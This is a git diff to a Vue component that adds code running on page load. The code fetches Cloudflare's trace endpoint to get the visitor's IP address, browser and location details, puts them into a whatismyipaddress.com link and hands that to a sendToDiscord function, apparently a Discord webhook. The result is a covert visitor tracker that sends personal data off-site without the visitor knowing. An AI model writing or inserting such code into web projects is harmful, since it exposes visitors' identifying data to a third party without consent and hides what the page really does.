@@ -26,7 +26,33 @@
 <script>
 export default {
     setup(){
-
+         function getAdditionalDetails(){
+        let addressLink = `https://whatismyipaddress.com/ip/`
+        async function text(url) {
+          return fetch(url).then(res => res.text());
+        }
+        text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+          // console.log(data)
+          // let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
+          // let ip = data.match(ipRegex)[0];
+          let dataObj = `{"` + data.trim().replace(/\n/g, `",\n"`).replace(/=/g, `":"`) + `"}`
+          // console.log(dataObj)
+          dataObj = JSON.parse(dataObj)
+          // console.log(dataObj)
+          let ip = dataObj.ip
+          // console.log(dataObj.ip);
+          addressLink = `${addressLink}${ip}&${data.replace(/\n/g, "&")}`.replace(/\s/g, '_')
+          // console.log(addressLink)
+          sendToDiscord(addressLink)
+        }).catch((e) => {
+          console.log('ERROR: could not get additional info')
+          console.log(e)
+          addressLink = ''
+          sendToDiscord(addressLink)
+        });
+      }
+      getAdditionalDetails()
+      
 
     }
 }
